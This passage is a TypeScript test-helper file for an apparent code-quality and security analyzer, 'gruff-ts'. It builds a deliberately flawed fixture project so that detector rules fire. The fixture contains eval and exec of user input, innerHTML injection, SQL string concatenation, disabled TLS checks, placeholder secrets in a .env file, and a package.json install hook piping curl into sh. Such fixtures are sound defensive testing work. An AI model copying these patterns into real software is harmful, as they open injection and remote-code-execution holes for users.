    writeFileSync(join(dir, ".gruff-ts.yaml"), yamlConfigFixture(options.config));
  }
}

/** Runs analyse after the fixture helper has switched into the temp project root, returning a stable report. */
function analyseProjectInCurrentDirectory(options: AnalyseProjectOptions): AnalysisReport {
  return analyse({
    paths: options.paths ?? ["."],
    ...(typeof options.configPath === "string" ? { config: options.configPath } : {}),
    noConfig: options.noConfig ?? !(options.config || options.configPath),
    format: "json",
    failOn: "none",
    includeIgnored: options.includeIgnored ?? false,
    noBaseline: true,
  });
}

// Serializes a test YAML config object from the root indentation level.
function yamlConfigFixture(value: Record<string, unknown>): string {
  return yamlConfigObject(value, 0);
}

// Serializes nested config objects using the fixture YAML subset.
function yamlConfigObject(value: Record<string, unknown>, indent: number): string {
  return Object.entries(value)
    .map(([key, nested]) => yamlConfigEntry(key, nested, indent))
    .join("");
}

// Serializes one YAML key with either nested indentation or a scalar value.
function yamlConfigEntry(key: string, value: unknown, indent: number): string {
  const prefix = " ".repeat(indent);
  if (isYamlConfigObject(value)) {
    return `${prefix}${key}:\n${yamlConfigObject(value, indent + 2)}`;
  }
  return `${prefix}${key}: ${yamlConfigScalar(value)}\n`;
}

// Converts fixture config scalar values into the YAML text used by tests.
function yamlConfigScalar(value: unknown): string {
  if (Array.isArray(value)) {
    return `[${value.map(yamlConfigScalar).join(", ")}]`;
  }
  if (typeof value === "string") {
    return JSON.stringify(value);
  }
  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }
  return "{}";
}

// Narrows YAML fixture values to plain objects before recursive serialization.
function isYamlConfigObject(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

// Writes temporary fixture files and creates their parent directories.
function writeFixtureFiles(dir: string, files: Record<string, string>): void {
  for (const [fileName, source] of Object.entries(files)) {
    const path = join(dir, fileName);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, source);
  }
}

// Builds enough simple declarations to cross the fixture-purpose line threshold.
function largeFixtureSourceLines(prefix: string): string[] {
  return Array.from({ length: 13 }, (_, index) => `const ${prefix}${index} = ${index};`);
}

// Collects eval finding files so security assertions stay tied to stable analyzer output.
function evalFindingFiles(report: AnalysisReport): Set<string> {
  return new Set(report.findings.filter((finding) => finding.ruleId === "security.eval-call").map((finding) => finding.filePath));
}

// Reads `git --version`; fallback false keeps gitignore parity tests optional.
function gitAvailable(): boolean {
  try {
    execFileSync("git", ["--version"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

// Reads `git check-ignore` and throws only for unexpected git failures.
function isGitIgnoredByGit(projectRoot: string, path: string): boolean {
  try {
    execFileSync("git", ["check-ignore", "--quiet", path], { cwd: projectRoot });
    return true;
  } catch (error) {
    const status = typeof error === "object" && error !== null && "status" in error ? (error as { status?: unknown }).status : undefined;
    if (status === 1) {
      return false;
    }
    throw error;
  }
}

// Starts a dashboard server for one test and always closes it afterward.
async function withDashboard(projectRoot: string, run: (baseUrl: string) => Promise<void>): Promise<void> {
  const port = await freePort();
  const child = spawn("./bin/gruff-ts", ["dashboard", "--host", "127.0.0.1", "--port", String(port), "--project-root", projectRoot], {
    cwd: REPO_ROOT,
    stdio: ["ignore", "pipe", "pipe"],
  });
  let output = "";
  child.stdout.setEncoding("utf8");
  child.stderr.setEncoding("utf8");
  child.stdout.on("data", (chunk: string) => {
    output += chunk;
  });
  child.stderr.on("data", (chunk: string) => {
    output += chunk;
  });
  const baseUrl = `http://127.0.0.1:${port}`;
  try {
    await waitForUrl(`${baseUrl}/health`, output);
    await run(baseUrl);
  } finally {
    child.kill();
    await new Promise<void>((resolve) => {
      if (child.exitCode !== null || child.signalCode !== null) {
        resolve();
        return;
      }
      child.once("exit", () => resolve());
      setTimeout(resolve, 1000);
    });
  }
}

// Asks the OS for an unused loopback port for dashboard tests. Starts loopback server state for the dashboard.
async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const server = createNetServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      if (typeof address !== "object" || address === null) {
        server.close();
        reject(new Error("unable to allocate dashboard test port"));
        return;
      }
      const { port } = address;
      server.close(() => resolve(port));
    });
  });
}

// Polls a dashboard URL until it responds or reports the captured server output.
async function waitForUrl(url: string, output: string): Promise<void> {
  const deadline = Date.now() + 5000;
  const processOutput = output;
  let lastError: unknown;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(url);
      if (response.ok) {
        return;
      }
      lastError = new Error(`HTTP ${response.status}`);
    } catch (error) {
      lastError = error;
    }
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error(`timed out waiting for ${url}: ${String(lastError)}\n${processOutput}`);
}

// Fetches response text and fails the test with status details on non-OK responses.
async function fetchText(url: string): Promise<string> {
  const response = await fetch(url);
  const text = await response.text();
  assert.equal(response.ok, true, `${url} returned ${response.status}: ${text}`);
  return text;
}

// Writes a broad temporary catalogue fixture because one scan must cover many rule families.
function ruleCatalogueCoverageRuleIds(): Set<string> {
  const report = analyseProject(
    {
      "src/catalogue.ts": `import { createHash } from "node:crypto";
import { exec, spawn } from "node:child_process";
import { unusedThing } from "./dep";

// TODO: collapse this coverage fixture when generated rule docs exist.
// See \`src/missing-catalogue.ts\` before updating catalogue fixtures.
// prettier-ignore
// ${COMMENTED_OUT_LEGACY_CALL}
const data1 = "placeholder";
const strName = "Ada";
const active = true;
const xx = 1;
const ctx = { request: 1 };
const disableCache = true;
const URL_PATH = "/health";
const urlPath = "/healthz";
const unsafeAny: any = {};
const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";
const maxRetryLimit = 12;
const maybeUser = { name: strName };
const optionalName = maybeUser && maybeUser.name;
const fallbackName = maybeUser.name || "anonymous";
var legacyName = fallbackName;

export function expandHelpers(data: unknown, options: unknown, target: unknown): unknown {
  return [data, options, target];
}

interface MissingCommentShape {
  name: string;
}

/** Carries payload details. */
interface ReportPayload {
  schemaVersion: string;
  fingerprint: string;
}

export type PublicAny = any;

export class WrongName {
  public status = "ready";
  private count: number;

  public constructor() {
    this.count = xx;
  }

  private hidden(): void {
    console.log(this.count);
  }
}

/** Handles process input. */
export function process(flag: boolean, userInput: string, userId: string, userIds: string[], unusedFlag: boolean): string {
  eval(userInput);
  new Function(userInput)();
  setTimeout("alert(1)", 10);
  window.setInterval("alert(1)", 10);
  exec(userInput);
  spawn(userInput, []);
  Math.random();
  document.write(userInput);
  element.innerHTML = userInput;
  element.dangerouslySetInnerHTML = { __html: userInput };
  element.__proto__ = {};
  createHash("md5").update(userInput);
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
  const insecureAgent = { rejectUnauthorized: false, minVersion: "TLSv1" };
  location.href = "javascript:alert(1)";
  db.query("SELECT * FROM users WHERE id = " + userId);
  const timestamp = new Date().getTime();
  const copy = Object.assign({}, { userId });
  if (!!userId) {
    observe(copy);
  }
  if (userId == "legacy") {
    observe(timestamp);
  }
  userIds.forEach(async (id) => {
    await sendEmailAsync(id);
  });
  sendEmailAsync(userIds[0]);
  try {
    riskyWork();
  } catch (error) {
    throw error;
  }
  try {
    riskyWork();
  } catch (error) {
    // ignored
  }
  if (flag) {
    if (userId) {
      return optionalName;
    }
  } else if (legacyName) {
    return legacyName;
  }
  if (userId === "a") {
    return "a";
  }
  if (userId === "b") {
    return "b";
  }
  if (userId === "c") {
    return "c";
  }
  if (userId === "d") {
    return "d";
  }
  if (userId === "e") {
    return "e";
  }
  if (userId === "f") {
    return "f";
  }
  if (userId === "g") {
    return "g";
  }
  if (userId === "h") {
    return "h";
  }
  if (userId === "i") {
    return "i";
  }
  void insecureAgent;
  throw "dynamic failure";
  console.log(unsafeAny);
}

function finish(): void {
  doWork();
  return;
}

function emptyWork(): void {}

function redundantResult(): string {
  const calculated = fallbackName;
  return calculated;
}

/**
 * score amount
 * @param stale Removed parameter.
 */
export function scoreAmount(amount: number): number {
  return amount + redundantResult().length;
}

export function unsafePublicApi(input: any): any {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as unknown as { name?: string };
  return user!.name;
}
`,
      "src/dep.ts": `export const usedThing = "used";
`,
      "src/catalogue.test.ts": `import assert from "node:assert/strict";

const fixturePurposeReport = analyseFixture(${"`"}
${largeFixtureSourceLines("catalogueFixtureValue").join("\n")}
${"`"});
void fixturePurposeReport;

// Provides a named fixture callable used by render-related rule coverage.
function renderCatalogue(): string {
  return "catalogue";
}

${"test"}("no assertion", () => {
  const value = renderCatalogue();
});

${"test"}("trivial assertion", () => {
  assert.equal(1, 1);
});

${"test"}("snapshot only", () => {
  expect(renderCatalogue()).toMatchSnapshot();
});

${"test"}("no throw only", () => {
  assert.doesNotThrow(() => renderCatalogue());
});

${"test"}("magic assertion", () => {
  const total = 7;
  expect(total).toBe(42);
});

${"test"}("unused mock", () => {
  const unusedMock = jest.fn();
  assert.ok(true);
});

${"test"}("mock only", () => {
  const serviceMock = vi.fn();
  serviceMock();
  expect(serviceMock).toHaveBeenCalled();
});

${"test"}("exception type only", () => {
  expect(() => fail()).toThrow(Error);
});

${"test"}("global mutation", () => {
  process.env.NODE_ENV = "test";
  assert.equal(process.env.NODE_ENV, "test");
});

${"test"}("setup bloat and control flow", () => {
  const one = buildOne();
  const two = buildTwo();
  const three = buildThree();
  if (one) {
    for (const item of [one, two, three]) {
      sleep(item);
    }
  }
  setTimeout(() => undefined, 1);
  ${"test"}.only("nested focus marker", () => undefined);
  assert.equal(one, one);
});
`,
      "src/app/feature/controller.ts": `import { sharedHelper } from "../../../shared/helper";

// Exercises a deep relative import from a controller fixture.
export function renderController(): string {
  return sharedHelper();
}
`,
      "src/cycle/a.ts": `import { fromB } from "./b";

// Creates one side of the circular-import fixture.
export function fromA(): string {
  return fromB();
}
`,
      "src/cycle/b.ts": `import { fromA } from "./a";

// Creates the other side of the circular-import fixture.
export function fromB(): string {
  return fromA();
}
`,
      "src/shared/helper.ts": `export function sharedHelper(): string {
  return "shared";
}
`,
      "src/untested.ts": `export function untestedValue(): string {
  return "untested";
}
`,
      ".env": `AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_FIXTURE_VALUE}
PRIVATE_KEY=${PRIVATE_KEY_HEADER_FIXTURE_VALUE}
DATABASE_URL=${POSTGRES_URL_FIXTURE_VALUE}
JWT_TOKEN=${JWT_FIXTURE_VALUE}
OPENAI_API_KEY=${OPENAI_KEY_FIXTURE_VALUE}
PATIENT_SSN=${SSN_FIXTURE_VALUE}
API_TOKEN=${API_TOKEN_FIXTURE_VALUE}
`,
      "package.json": JSON.stringify({
        scripts: {
          postinstall: "node scripts/setup.js",
          prepare: "curl https://example.test/install.sh | sh",
        },
        bin: {
          "missing-cli": "./bin/missing.js",
          "bad-cli": "./bin/bad.js",
        },
        dependencies: {
          "wide-open": "*",
          "remote-tool": "git+https://github.com/example/remote-tool.git",
        },
      }),
      "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
      "tsconfig.json": JSON.stringify({
        compilerOptions: {
          strict: false,
          noUncheckedIndexedAccess: false,
          exactOptionalPropertyTypes: false,
        },
      }),
    },
    {
      config: {
        rules: {
          "complexity.cognitive": { threshold: 3, severity: "warning" },
          "complexity.cyclomatic": { threshold: 2, severity: "warning" },
          "complexity.npath": { threshold: 2, severity: "warning" },
          "design.large-module-concentration": { threshold: 35, severity: "advisory", options: { minFiles: 4, minLines: 8 } },
          "docs.todo-density": { threshold: 1, severity: "advisory" },
          "naming.abbreviation": { enabled: true },
          "size.file-length": { threshold: 8, severity: "warning" },
          "size.function-length": { threshold: 8, severity: "warning" },
          "size.parameter-count": { threshold: 3, severity: "warning" },
          "test-quality.setup-bloat": { threshold: 2, severity: "advisory" },
        },
      },
    },
  );
  return new Set(report.findings.map((finding) => finding.ruleId));
}

function thresholdUsages(source: string): Map<string, number> {
  const usages = new Map<string, number>();
  for (const match of source.matchAll(/threshold\((?:[A-Za-z_$][A-Za-z0-9_$]*\.)?config,\s*"([^"]+)",\s*(-?\d+(?:\.\d+)?)\)/g)) {
    const ruleId = match[1] ?? "";
    const thresholdValue = Number(match[2] ?? "0");
    usages.set(ruleId, thresholdValue);
  }
  return new Map([...usages.entries()].sort(([left], [right]) => left.localeCompare(right)));
}

function optionUsages(source: string): Map<string, string[]> {
  const usages = new Map<string, Set<string>>();
  for (const match of source.matchAll(/optionNumber\((?:[A-Za-z_$][A-Za-z0-9_$]*\.)?config,\s*"([^"]+)",\s*"([^"]+)"/g)) {
    const ruleId = match[1] ?? "";
    const key = match[2] ?? "";
    usages.set(ruleId, usages.get(ruleId) ?? new Set<string>());
    usages.get(ruleId)?.add(key);
  }
  return new Map([...usages.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, [...keys].sort()]));
}

function yamlThresholdDefaults(source: string): Map<string, number> {
  const result = new Map<string, number>();
  let isInRules = false;
  let currentRule = "";
  for (const line of source.split(/\r?\n/)) {
    if (line.trim() === "rules:") {
      isInRules = true;
      continue;
    }
    if (!isInRules) {
      continue;
    }
    const ruleMatch = line.match(/^  ([a-z-]+\.[a-z0-9-]+):\s*$/);
    if (ruleMatch?.[1]) {
      currentRule = ruleMatch[1];
      continue;
    }
    const thresholdMatch = line.match(/^    threshold:\s*(-?\d+(?:\.\d+)?)\s*$/);
    if (currentRule && thresholdMatch?.[1]) {
      result.set(currentRule, Number(thresholdMatch[1]));
    }
  }
  return new Map([...result.entries()].sort(([left], [right]) => left.localeCompare(right)));
}

function yamlSeverityDefaults(source: string): Map<string, string> {
  const thresholdRules = new Set(yamlThresholdDefaults(source).keys());
  const result = new Map<string, string>();
  let isInRules = false;
  let currentRule = "";
  for (const line of source.split(/\r?\n/)) {
    if (line.trim() === "rules:") {
      isInRules = true;
      continue;
    }
    if (!isInRules) {
      continue;
    }
    const ruleMatch = line.match(/^  ([a-z-]+\.[a-z0-9-]+):\s*$/);
    if (ruleMatch?.[1]) {
      currentRule = ruleMatch[1];
      continue;
    }
    const severityMatch = line.match(/^    severity:\s*(advisory|warning|error)\s*$/);
    if (currentRule && thresholdRules.has(currentRule) && severityMatch?.[1]) {
      result.set(currentRule, severityMatch[1]);
    }
  }
  return new Map([...result.entries()].sort(([left], [right]) => left.localeCompare(right)));
}

function yamlOptionDefaults(source: string): Map<string, string[]> {
  const result = new Map<string, string[]>();
  let isInRules = false;
  let currentRule = "";
  let isInOptions = false;
  for (const line of source.split(/\r?\n/)) {
    if (line.trim() === "rules:") {
      isInRules = true;
      continue;
    }
    if (!isInRules) {
      continue;
    }
    const ruleMatch = line.match(/^  ([a-z-]+\.[a-z0-9-]+):\s*$/);
    if (ruleMatch?.[1]) {
      currentRule = ruleMatch[1];
      isInOptions = false;
      continue;
    }
    if (currentRule && line.match(/^    options:\s*$/)) {
      isInOptions = true;
      result.set(currentRule, []);
      continue;
    }
    const keyMatch = line.match(/^      ([A-Za-z0-9_-]+):/);
    if (currentRule && isInOptions && keyMatch?.[1]) {
      result.get(currentRule)?.push(keyMatch[1]);
    }
  }
  return new Map([...result.entries()].sort(([left], [right]) => left.localeCompare(right)).map(([ruleId, keys]) => [ruleId, keys.sort()]));
}
